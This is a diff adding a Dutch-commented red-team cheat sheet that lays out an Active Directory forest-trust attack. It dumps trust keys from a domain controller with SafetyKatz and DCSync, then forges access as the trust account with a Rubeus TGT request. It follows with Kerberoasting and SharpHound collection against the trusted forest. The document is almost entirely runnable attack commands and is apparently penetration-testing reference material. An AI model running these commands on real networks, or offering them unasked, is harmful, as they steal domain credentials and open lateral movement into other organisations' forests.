@@ -1,0 +1,45 @@
+# Trust Account TGT — Toegang verkrijgen als domain user via trust account
+# Gebruik het trust account wachtwoord om een TGT te krijgen in het vertrouwde forest
+
+# === Context ===
+# Elk forest trust creëert een trust account (FOREST$) in het vertrouwde forest
+# Het trust account wachtwoord is symmetrisch (beide kanten kennen het)
+# Met een TGT als trust account heb je standaard "domain user" rechten in het vertrouwde forest
+
+# === Stap 1: Extract trust keys ===
+
+# Via lsadump::trust op de DC
+SafetyKatz.exe "lsadump::evasive-trust /patch" "exit"
+# Zoek: [In] SOURCE.DOMAIN -> TARGET.DOMAIN
+# Noteer: rc4_hmac_nt of aes256_hmac
+
+# Of via DCSync van het trust account
+SafetyKatz.exe "lsadump::evasive-dcsync /user:SOURCE\TARGET$" "exit"
+
+# === Stap 2: Vraag TGT aan als trust account ===
+Rubeus.exe asktgt /user:TARGET_FOREST$ /domain:SOURCE_DOMAIN /rc4:TRUST_KEY /dc:SOURCE_DC /nowrap /ptt
+
+# === Stap 3: Verificatie — domain user toegang ===
+klist
+ls \\TARGET_DC\SYSVOL
+dir \\TARGET_DC\NETLOGON
+
+# === Wanneer nuttig? ===
+# - Als domain user in het doel-forest kun je:
+#   - SYSVOL/NETLOGON lezen (scripts, GPO's met wachtwoorden)
+#   - Kerberoasting uitvoeren
+#   - LDAP enumeratie doen
+#   - BloodHound data verzamelen
+#   - Zoeken naar misconfiguraties en ACL misbruik
+
+# === Combineer met verdere aanvallen ===
+
+# Kerberoasting in het vertrouwde forest
+Rubeus.exe kerberoast /domain:TARGET_DOMAIN /dc:TARGET_DC /nowrap
+
+# BloodHound collectie
+SharpHound.exe -c All -d TARGET_DOMAIN --domaincontroller TARGET_DC
+
+# Noot: Trust account = standaard domain user (geen speciale rechten)
+# Noot: Dit is legaal Kerberos gedrag, geen exploit
+# Noot: SID filtering blokkeert SID history maar niet het trust account zelf
